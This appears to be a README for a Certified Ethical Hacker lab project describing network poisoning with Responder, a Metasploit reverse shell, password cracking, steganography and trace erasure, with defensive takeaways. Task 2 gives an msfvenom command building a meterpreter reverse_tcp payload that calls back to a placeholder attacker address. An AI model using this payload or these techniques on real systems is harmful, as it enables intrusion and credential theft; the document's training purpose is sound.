# System_Hacking
# 🕵️‍♂️ Project: Advanced Attacks & Evasion Techniques

This repository documents my practical cybersecurity internship tasks focused on demonstrating **network poisoning**, **reverse shells**, **password auditing**, **steganography**, and **privacy erasure** as part of the Certified Ethical Hacker v12 practicals.

---

## 📌 Tasks Completed

---

### 1️⃣ SMB/HTTP Poisoning & Hash Capture with Responder

- **Tool:** Responder
- ✅ **Demonstrated:**
  - LLMNR/NBT-NS poisoning to trick clients into sending credentials.
  - Captured **NTLMv2 hashes** and clear-text passwords from SMB and HTTP traffic.
- **Key Insight:** This highlights the risk of insecure network configurations and the need to disable unnecessary protocols like LLMNR.

---

### 2️⃣ Exploiting with Reverse Shell

- **Used:** Metasploit `reverse_tcp` module.
- ✅ **Steps:**
  1. Created a malicious payload with `msfvenom`:
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=4444 -f exe > shell.exe
     ```
  2. Delivered the payload to the target machine.
  3. Established a reverse shell connection and gained remote access.
- **Importance:** Shows how attackers exploit known vulnerabilities and maintain foothold.

---

### 3️⃣ Password Auditing & Cracking with L0phtCrack

- ✅ **Performed:**
  - Imported password hashes.
  - Ran dictionary and brute-force attacks.
- **Outcome:** Assessed password strength.
- **Key Takeaway:** Weak passwords are easily cracked; organizations must enforce **strong password policies** and regular auditing.

---

### 4️⃣ Steganography with OpenStego & Steghide

- ✅ **Used:**
  - **OpenStego**: Embed secret messages in image files.
  - **Steghide**: Hide and extract data using passphrases.
- **Demonstrated:** How data can be covertly exfiltrated in innocuous-looking files.
- **Insight:** Highlights the risk of hidden channels and why outbound data flows should be monitored.

---

### 5️⃣ Privacy Erasure with Privacy Eraser

- ✅ **Showcased:**
  - Secure deletion of browser history, cookies, temporary files, and system logs.
  - Overwriting deleted data to prevent recovery.
- **Purpose:** Demonstrates good privacy hygiene and why secure erasure is critical when decommissioning systems or devices.

---

## 🛠️ Tools Used

| Tool            | Purpose                                      |
|-----------------|----------------------------------------------|
| **Responder**   | Network poisoning & credential harvesting    |
| **Metasploit**  | Payload creation & reverse shell exploitation|
| **L0phtCrack**  | Password auditing and cracking               |
| **OpenStego**   | Steganography (hide data in images)          |
| **Steghide**    | Advanced steganography with passphrases      |
| **Privacy Eraser** | Secure removal of traces & sensitive files |

---

## 📚 Key Learnings

- SMB/HTTP poisoning remains an effective threat when insecure protocols are enabled.
- Reverse shells show how vulnerable systems can be leveraged for persistent access.
- Weak passwords are still a major vulnerability — password auditing must be regular.
- Steganography can bypass traditional security tools — data loss prevention is crucial.
- Secure wiping of traces helps protect privacy and mitigates residual risks.

---

## ⚠️ Disclaimer

This project was conducted in a **controlled lab environment** for **educational purposes only**.  
Never attempt these techniques without explicit written permission from the system owner.

---
